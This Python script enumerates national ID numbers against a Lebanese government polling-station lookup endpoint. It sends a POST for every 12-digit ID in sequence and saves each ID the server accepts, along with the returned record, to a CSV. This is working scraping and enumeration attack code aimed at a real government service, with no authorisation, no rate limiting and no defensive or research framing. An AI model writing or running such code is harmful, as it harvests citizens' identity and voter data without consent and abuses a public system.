import requests
import pandas as pd

url = "https://www.dgcs.gov.lb/PollingStations/GetPollingStationExpat"

if __name__ == '__main__':
    # We want to try all possible IDs from zero to the biggest 12 digit number

    Valid_IDs = pd.DataFrame(columns = ['National ID', 'Data'])
    for id in range(52693,1000000000000):

        id_txt = str(id).zfill(12)
        print(id_txt)

        myobj = {'Type': 'IDNumber', 'IDNumber': id_txt}
        # verify needs to be false since SSL is expired
        # x = requests.post(url, data=myobj, verify=False)
        x = requests.post(url, data=myobj)
        # f.write(x.text)
        # print(x.text)
        print(x.json()['success'])
        if(x.json()['success']):
            print("This was a valid ID number")
            with open("Valid National ID.csv",mode='a') as f:
                f.write(id_txt)
                f.write('\n')
            Valid_IDs = Valid_IDs.append({'National ID' : id_txt, 'Data':x.text},
                ignore_index = True)
        # Lets' Export the valid ID numbers to CSV so we can see which are valid
    Valid_IDs.to_csv("Valid National ID.csv",index=False)
